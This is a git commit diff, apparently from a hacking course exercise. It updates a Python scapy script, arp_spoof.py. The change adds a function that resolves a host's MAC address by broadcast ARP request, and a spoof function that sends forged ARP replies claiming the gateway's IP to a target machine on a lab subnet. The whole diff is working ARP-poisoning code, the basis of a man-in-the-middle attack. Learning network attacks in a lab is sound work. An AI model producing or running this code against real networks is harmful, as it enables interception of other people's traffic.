e4712e3f7adbf40f4deb5d56d6a5b89b790d4b1f
jean_kali <jeanandrewfuentes@gmail.com>
2020-02-29 04:55:57 -0500

    Extracting MAC Address from IP

--- arp_spoof.py
+++ arp_spoof.py
@@ -3,10 +3,18 @@
 import scapy.all as scapy
 
 target_ip="10.0.2.15"
-target_mac="08:00:27:31:de:a3"
 gateway_ip = "10.0.2.1"
 
-packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip )
-print(packet.show())
-print(packet.summary())
-scapy.send(packet)
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # 34. Combining Frames Review
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # this returns two list; answered and unanswered
+    return answered_list[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
+    print(packet.show())
+    print(packet.summary())
+    scapy.send(packet)
